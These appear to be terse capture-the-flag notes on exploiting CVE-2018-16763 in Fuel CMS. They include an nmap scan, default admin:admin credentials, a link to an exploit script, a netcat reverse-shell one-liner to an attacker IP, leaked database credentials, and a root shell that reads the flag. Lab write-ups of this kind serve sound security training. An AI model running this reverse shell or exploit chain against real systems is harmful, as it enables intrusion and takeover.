**Tristan Gomez**

 CVE-2018-16763
nmap
```
└─$ sudo nmap -Pn 10.10.202.5
[sudo] password for gomez22: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 12:02 PDT
Nmap scan report for 10.10.202.5
Host is up (0.19s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 49.31 seconds
```

`admin:admin`
`https://github.com/AssassinUKG/fuleCMS/blob/main/fuelCMS.py`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.248.108 1111 >/tmp/f`

```
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

```

```
root@ubuntu:/var/www/html# whoami
root
root@ubuntu:/var/www/html# cat /root/root.txt
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 
root@ubuntu:/var/www/html# 
```
